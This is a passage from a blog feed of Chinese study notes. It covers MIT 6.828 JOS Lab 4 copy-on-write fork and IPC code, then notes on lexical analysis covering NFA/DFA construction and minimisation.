class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>fork创建子进程,为子进程映射(duppage)地址空间.为自身和子进程安装错误处理函数.<br>注意子进程的错误处理函数一定要由父进程安装,因为子进程在调用函数或系统调用时的压栈操作会触发页面错误(目前子进程的栈还是COW的),而错误处理函数还未安装,无法处理.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// User-level fork with copy-on-write.</span></span><br><span class="line"><span class="comment">// Set up our page fault handler appropriately.</span></span><br><span class="line"><span class="comment">// Create a child.</span></span><br><span class="line"><span class="comment">// Copy our address space and page fault handler setup to the child.</span></span><br><span class="line"><span class="comment">// Then mark the child as runnable and return.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns: child's envid to the parent, 0 to the child, &lt; 0 on error.</span></span><br><span class="line"><span class="comment">// It is also OK to panic on error.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//   Use uvpd, uvpt, and duppage.</span></span><br><span class="line"><span class="comment">//   Remember to fix "thisenv" in the child process.</span></span><br><span class="line"><span class="comment">//   Neither user exception stack should ever be marked copy-on-write,</span></span><br><span class="line"><span class="comment">//   so you must allocate a new page for the child's user exception stack.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">envid_t</span></span><br><span class="line"><span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">envid_t</span> ceid;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line">set_pgfault_handler(pgfault);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((ceid = sys_exofork())&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> ceid; </span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ceid == <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="comment">//child</span></span><br><span class="line">thisenv = &amp;(envs[sys_getenvid()&amp;<span class="number">0x3FF</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uintptr_t</span> va = <span class="number">0</span>; va &lt; UTOP;) </span><br><span class="line">{</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pde_t</span> uvpd[];</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pte_t</span> uvpt[];</span><br><span class="line"><span class="keyword">if</span> ((uvpd[va &gt;&gt; PDXSHIFT] &amp; PTE_P) == <span class="number">0</span>) </span><br><span class="line">{    <span class="comment">// page table page not found.</span></span><br><span class="line">va += NPTENTRIES * PGSIZE;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> ((uvpt[va &gt;&gt; PTXSHIFT] &amp; PTE_P) == <span class="number">0</span>) </span><br><span class="line">{    <span class="comment">// page table entry not found.</span></span><br><span class="line">va += PGSIZE;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (va == UXSTACKTOP - PGSIZE) </span><br><span class="line">{    <span class="comment">// UXSTACKTOP is not remmaped!</span></span><br><span class="line">va += PGSIZE;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// this page should be duppage()d.</span></span><br><span class="line"><span class="keyword">if</span> ((result = duppage(ceid, (<span class="type">unsigned</span>)(va/PGSIZE))) &lt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">va += PGSIZE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((result = sys_page_alloc(ceid, (<span class="type">void</span> *)(UXSTACKTOP-PGSIZE), (PTE_U|PTE_W))) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> _pgfault_upcall(<span class="type">void</span>);</span><br><span class="line">sys_env_set_pgfault_upcall(ceid,_pgfault_upcall);</span><br><span class="line">sys_env_set_status(ceid,ENV_RUNNABLE);</span><br><span class="line"><span class="keyword">return</span> ceid;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Copy-On-Write流程分析"><a href="#Copy-On-Write流程分析" class="headerlink" title="Copy-On-Write流程分析"></a>Copy-On-Write流程分析</h5><h6 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h6><p>为了开启Copy-On-Write,要为环境安装_pgfault_upcall函数和_pgfault_handler.前者是汇编实现的page fault处理例程的入口点,会调用后者进行page fault的处理并完成traptime状态的恢复.该安装过程由set_pgfault_handler函数完成,且由于上文提过的原因,子进程_pgfault_upcall函数必须由父进程安装.set_pgfault_handler同时为进程分配单独的错误处理堆栈,子进程的错误处理堆栈由父进程分配.</p><h6 id="触发Copy-On-Write"><a href="#触发Copy-On-Write" class="headerlink" title="触发Copy-On-Write"></a>触发Copy-On-Write</h6><p>当进程对带有PTE_COW标志的页进行写入操作时,由于没有PTE_W权限,处理器触发pagefault,陷入内核态,由常规的异常处理流程,最终到达内核态的page_fault_handler函数.该函数检查环境的_pgfault_upcall是否安装,是否是递归页面错误,为页面处理准备UTrapFrame结构,最后env_run返回到用户态从_pgfault_upcall开始执行.</p><h6 id="处理Copy-On-Write"><a href="#处理Copy-On-Write" class="headerlink" title="处理Copy-On-Write"></a>处理Copy-On-Write</h6><p>_pgfault-upcall函数调用用户安装的_pgfault_handler.本实现中该函数流程如下.检查此次pgfault的类型,是否为写入操作,页面是否是COW…若通过检查便为触发pgfault的虚拟地址重新分配一个物理页,拷贝原页的内容.</p><h6 id="恢复到traptime"><a href="#恢复到traptime" class="headerlink" title="恢复到traptime"></a>恢复到traptime</h6><p>现在触发pgfault的地址已经有了独立的一个可写页面,pgfault_upcall函数恢复到traptime状态继续执行,这次的写入操作可以正常进行了.</p><h4 id="Inter-Process-communication-IPC"><a href="#Inter-Process-communication-IPC" class="headerlink" title="Inter-Process communication (IPC)"></a>Inter-Process communication (IPC)</h4><p>本实现中采用的共享方式是:</p><ol><li>通过envs所在的所有环境共享的可读页传递value.</li><li>将sender的某页面映射到recver的页面上<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_ipc_try_send</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">uint32_t</span> value, <span class="type">void</span> *srcva, <span class="type">unsigned</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">pte_t</span>* pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">0</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((e-&gt;env_status != ENV_NOT_RUNNABLE) || (e-&gt;env_ipc_recving==<span class="number">0</span>))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_IPC_NOT_RECV;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(((<span class="type">uintptr_t</span>)srcva!=<span class="number">-1</span>)&amp;&amp;((<span class="type">uintptr_t</span>)e-&gt;env_ipc_dstva!=<span class="number">-1</span>))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((<span class="type">uintptr_t</span>)srcva&gt;=UTOP||(srcva!=ROUNDDOWN(srcva,PGSIZE))||((perm&amp;PTE_SYSCALL)!=perm))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(page = page_lookup(curenv-&gt;env_pgdir,srcva,&amp;pte)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(((*pte&amp;PTE_W)==<span class="number">0</span>)&amp;&amp;((perm&amp;PTE_W)==PTE_W))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = page_insert(e-&gt;env_pgdir,page,e-&gt;env_ipc_dstva,perm)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">e-&gt;env_ipc_perm = perm;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">e-&gt;env_ipc_perm = <span class="number">0</span>;</span><br><span class="line">e-&gt;env_ipc_recving = <span class="number">0</span>;</span><br><span class="line">e-&gt;env_ipc_from = curenv-&gt;env_id;</span><br><span class="line">e-&gt;env_ipc_value = value;</span><br><span class="line"></span><br><span class="line">e-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_ipc_recv</span><span class="params">(<span class="type">void</span> *dstva)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">uint32_t</span>)dstva != <span class="number">-1</span>) </span><br><span class="line">{</span><br><span class="line">        <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)dstva &gt;= UTOP) || (dstva!=ROUNDDOWN(dstva,PGSIZE)))</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    }</span><br><span class="line">    curenv-&gt;env_ipc_recving = <span class="number">1</span>;</span><br><span class="line">    curenv-&gt;env_ipc_dstva = dstva;</span><br><span class="line">    curenv-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">    </span><br><span class="line">    curenv-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line">    sys_yield();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int32_t</span></span><br><span class="line"><span class="title function_">ipc_recv</span><span class="params">(<span class="type">envid_t</span> *from_env_store, <span class="type">void</span> *pg, <span class="type">int</span> *perm_store)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>(pg==<span class="literal">NULL</span>)</span><br><span class="line">pg = (<span class="type">void</span>*)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>((result = sys_ipc_recv(pg))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(from_env_store!=<span class="literal">NULL</span>)</span><br><span class="line">*from_env_store = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(perm_store!=<span class="literal">NULL</span>)</span><br><span class="line">*perm_store=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(from_env_store!=<span class="literal">NULL</span>)</span><br><span class="line">*from_env_store = thisenv-&gt;env_ipc_from;</span><br><span class="line"><span class="keyword">if</span>(perm_store!=<span class="literal">NULL</span>)</span><br><span class="line">*perm_store=thisenv-&gt;env_ipc_perm;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> thisenv-&gt;env_ipc_value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_send</span><span class="params">(<span class="type">envid_t</span> to_env, <span class="type">uint32_t</span> val, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>(pg == <span class="literal">NULL</span>)</span><br><span class="line">pg = (<span class="type">void</span>*)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">result = sys_ipc_try_send(to_env,val,pg,perm);</span><br><span class="line"><span class="keyword">if</span>(!result)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(result == -E_IPC_NOT_RECV)</span><br><span class="line">{</span><br><span class="line">sys_yield();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line">panic(<span class="string">"ipc_send: fail in send--%e\n"</span>,result);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>词法分析</title>
      <link href="/2023/Lexical-Analysis/"/>
      <url>/2023/Lexical-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h2><p>词法分析是编译的第一阶段.词法分析主要任务是读入输入字符,产生记号(token)序列,提交给语法分析使用.<br>由于这种交互模式,词法分析器可以作为语法分析器的子程序或协作程序.语法分析器每次调用词法分析器持续读入字符,直到识别出下一个记号.</p><p>词法分析除了产生记号,也收集记号相关的信息作为记号的属性(比如数字的值,标识符对应的字符串).记号影响语法分析,记号的属性影响记号的翻译.属性一般存储在符号表中.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121650256.png"></p><span id="more"></span><h2 id="记号、模式、词素"><a href="#记号、模式、词素" class="headerlink" title="记号、模式、词素"></a>记号、模式、词素</h2><p>词素是源程序的字符序列</p><p>模式是描述源程序中表示特定记号的词素集合的规则.</p><p>每个符合某模式的词素经词法分析后产生对应的记号.</p><h2 id="记号的描述"><a href="#记号的描述" class="headerlink" title="记号的描述"></a>记号的描述</h2><p>字母表: 有限符号的集合<br>语言是给定字母表上任意字符串的集合.</p><h3 id="正规表达式-Regular-Expressions"><a href="#正规表达式-Regular-Expressions" class="headerlink" title="正规表达式 Regular Expressions"></a>正规表达式 Regular Expressions</h3><p>正规表达式表示的语言叫做正规集.</p><h4 id="非正规集"><a href="#非正规集" class="headerlink" title="非正规集"></a>非正规集</h4><p>正规表达式描述能力有限,其不能描述均衡或嵌套结构,如具有配对括号的符号串集合.<br>正规表达式只能表示固定次数的重复或给定结构的没有指定次数的重复.</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>接下来我们要完成对一个给定的正规表达式r的识别器的构造.</p><h2 id="有穷自动机"><a href="#有穷自动机" class="headerlink" title="有穷自动机"></a>有穷自动机</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>语言的识别器是一个程序,它以字符串x作为输入,输出true(接受)或false来表示x是否是语言的句子.</p><p>不确定的有穷自动机(NFA):<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121724289.png"><br>NFA可以由带标记的有向图(状态转换图),转换表表示.<br>F(T,a)=S:在T状态时,如果当前输入字符是a,可以转换到S状态(对于NFA来说,这里的S可能是一个状态集合)<br>当且仅当对应的转换图中存在从开始状态到某个接受状态的路径,使得该路径的边上的标记恰好连成字符串x时,NFA接受字符串x.</p><p>确定的有穷自动机(DFA)是特殊的NFA:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121725005.png"><br>也就是对于当前正在识别的字符a,当前状态有唯一的转换,这非常适合计算机的模拟.</p><h3 id="模拟DFA"><a href="#模拟DFA" class="headerlink" title="模拟DFA"></a>模拟DFA</h3><p>算法: 持续读入字符并根据当前输入字符进行状态转换(“对于当前正在识别的字符a,当前状态有唯一的转换”),当输入结束,检查当前状态是否为一个接受状态.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121735931.png"></p><p>有了DFA的模拟算法,现在只需要构造r的DFA表示.</p><h3 id="从正规表达式到NFA"><a href="#从正规表达式到NFA" class="headerlink" title="从正规表达式到NFA"></a>从正规表达式到NFA</h3><p>然而更容易的方式是从正规表达式r先构造出一个NFA.</p><h4 id="Thompson构造法"><a href="#Thompson构造法" class="headerlink" title="Thompson构造法"></a>Thompson构造法</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121745954.png"></p><p>对于字符表中的每个符号a(包括ε),构造一个如下的NFA.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121750561.png"></p><p>接下来要做的便是根据正规表达式r来”组合”之前产生的NFA.<br>实际就是改变之前各NFA初始状态和接受状态,并增加一些结点和有向边,从而”组合”成r的NFA.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121758670.png"></p><p>这样产生的NFA有以下的性质:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121802370.png"></p><h3 id="从NFA到DFA"><a href="#从NFA到DFA" class="headerlink" title="从NFA到DFA"></a>从NFA到DFA</h3><p>其实就是消除ε转换(目标1)和对同一输入符号的多种转换(目标2).</p><h4 id="子集构造算法"><a href="#子集构造算法" class="headerlink" title="子集构造算法"></a>子集构造算法</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121820731.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121821896.png"></p><p>分析一下这个算法是怎么实现这两个目标的.</p><p>通过ε-closure()来合并只通过ε转换可以达到的状态为一个状态集,这个状态集是该算法操作的基本单位(目标1).<br>对于某个状态T对某个特定字符a的一种或多种(对于转换的结果而言)转换关系F(T,a),产生一个新的状态(这个状态是NFA中F(T,a)的所有输出状态的集合).之后再根据该状态集合里的每个状态在NFA中的转换关系得到状态集合之间的转换关系(目标2).</p><p>其实,两个目标都是通过将状态合并为状态集合的方式来实现的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121820231.png"></p><h3 id="NFA的双堆栈模拟"><a href="#NFA的双堆栈模拟" class="headerlink" title="NFA的双堆栈模拟"></a>NFA的双堆栈模拟</h3><p>至此我们已经完成了对正规表达式r的识别器的构造.而实际上,NFA也是可以直接模拟的.</p><h4 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h4><p>回想一下我们是怎么实现NFA到DFA转换的那两个目标,可以发现该模拟算法实质上是在运行中构造DFA.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121839249.png"></p><h4 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h4><p>我们要实现的结构有两个,当前状态集合,要转换到的状态集合.注意这里与DFA模拟时不同,DFA中状态集合是实现为一个新的状态,有状态集合之间独立的转换关系(新的转换表),而模拟NFA时我们只具有单个状态之间的转换关系.</p><p>这两个结构可以以两个栈的形式实现.一个栈表示当前状态集合,一个栈表示要转换到的状态集合.压入所有在ε-closure(当前状态)的输出状态.转换时遍历当前状态集合的每一个状态并进行状态转换,压入结果到另一个栈中.清空当前状态集合,两个栈交换身份.</p><h3 id="最长词素匹配"><a href="#最长词素匹配" class="headerlink" title="最长词素匹配"></a>最长词素匹配</h3><p>常见有如下的实现:如果有多个模式匹配成功,选择最长词素匹配的模式.<br>当当前状态集合中含有接受状态时,记录当前输入指针的位置和该接受状态后继续识别,直到NFA进入终止(无法状态转换或输入结束),恢复到最近一次保存的输入指针位置,以该接受状态为结果.</p><h3 id="基于DFA的模式匹配器的优化"><a href="#基于DFA的模式匹配器的优化" class="headerlink" title="基于DFA的模式匹配器的优化"></a>基于DFA的模式匹配器的优化</h3><h4 id="NFA的重要状态"><a href="#NFA的重要状态" class="headerlink" title="NFA的重要状态"></a>NFA的重要状态</h4><p>如果一个NFA的状态有一个标记为非ε的出边,那么该状态为重要状态.<br>如果两个子集的重要状态相同且两者同时包含或不包含NFA的接受状态,那么这两个子集可被认为是等同的.</p><blockquote><p>The constructed NFA has only one accepting state, but this state, having<br>no out-transitions, is not an imp ortant state. By concatenating a unique right<br>endmarker # to a regular expression r , we give the accepting state for r a<br>transition on #, making it an imp ortant state of the NFA for (r )#. In other<br>words, by using the augmented regular expression (r )#, we can forget ab out<br>accepting states as the subset construction pro ceeds; when the construction is<br>complete, any state with a transition on # must b e an accepting state.</p></blockquote><h4 id="Functions-Computed-From-the-Syntax-Tree"><a href="#Functions-Computed-From-the-Syntax-Tree" class="headerlink" title="Functions Computed From the Syntax Tree"></a>Functions Computed From the Syntax Tree</h4><h5 id="Compute"><a href="#Compute" class="headerlink" title="Compute"></a>Compute</h5><p>为了直接从正规表达式r构造DFA,需要从语法树中计算这四个函数.Each denition refers to the syntax tree for a particular augmented regular expression (r )#</p><p>直白点说,nullable就是该位置代表的字符串是否可以为空(ε).<br>firstpos就是该节点所代表的字符串可能的开始位置集合.<br>lastpos就是该节点所代表的字符串可能的结束位置集合.<br>followpos就是可能的紧跟着该位置的位置集合.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122309087.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122309685.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122312703.png"></p><p>最后我们需要的其实只有follow集,根据求出的follow集可以得到这样一个没有ε的NFA<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131045245.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131044965.png"></p><h5 id="TO-DFA"><a href="#TO-DFA" class="headerlink" title="TO DFA"></a>TO DFA</h5><p>其实感觉和之前的思想是差不多的,状态-&gt;状态集合.<br>使用根节点的first集合并初始状态,以是否有#转换来合并接受状态.其他状态由followpos来合并.<br>差别就在于之前是通过NFA的转换关系来合并的,这里是直接通过计算follow集来合并的(其实感觉是一回事).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131046225.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131046738.png"></p><h4 id="最小化DFA的状态数"><a href="#最小化DFA的状态数" class="headerlink" title="最小化DFA的状态数"></a>最小化DFA的状态数</h4><p>每一个正规集都可以由一个状态最少的DFA识别,这个DFA是唯一的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131120540.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131120171.png"></p><h4 id="表压缩算法"><a href="#表压缩算法" class="headerlink" title="表压缩算法"></a>表压缩算法</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131134804.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131134760.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 编译原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lexical-Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核设计的艺术 阅读笔记</title>
      <link href="/2023/The%20Art%20Of%20Linux%20Kernel%20Design--Notes/"/>
      <url>/2023/The%20Art%20Of%20Linux%20Kernel%20Design--Notes/</url>
      
